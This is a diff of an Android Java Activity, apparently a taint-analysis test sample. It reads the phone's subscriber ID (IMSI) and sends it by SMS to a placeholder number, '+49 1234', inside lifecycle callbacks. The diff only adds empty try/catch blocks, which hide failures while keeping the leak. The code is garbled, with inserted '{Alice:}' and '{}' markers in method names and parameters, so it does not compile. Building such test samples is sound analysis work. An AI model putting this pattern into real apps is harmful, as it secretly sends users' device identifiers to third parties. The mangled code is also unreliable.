@@ -26,20 +26,26 @@ static Context context;
     public String {Alice:}s;
 
 //    @Override
-    protected void {Alice:}onCreate{Alice:}(Bundle {Alice:}savedInstanceState) {
+    protected void onCreate{}(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout);
     }
 
 //    @Override
     public void onSaveInstanceState{}(Bundle {}outState) {
-        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-        s = telephonyManager.getSubscriberId();
+        try {
+            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            s = telephonyManager.getSubscriberId();
+        } catch (NullPointerException e) {
+        }catch(ClassCastException ignore){}
     }
 
 //    @Override
     public void onRestoreInstanceState{}(Bundle {}outState) {
-        SmsManager sms = SmsManager.getDefault();
-        sms.sendTextMessage("+49 1234", null, s, null, null);
+        try {
+            SmsManager sms = SmsManager.getDefault();
+            sms.sendTextMessage("+49 1234", null, s, null, null);
+        } catch (NullPointerException e) {
+        }
     }
 }
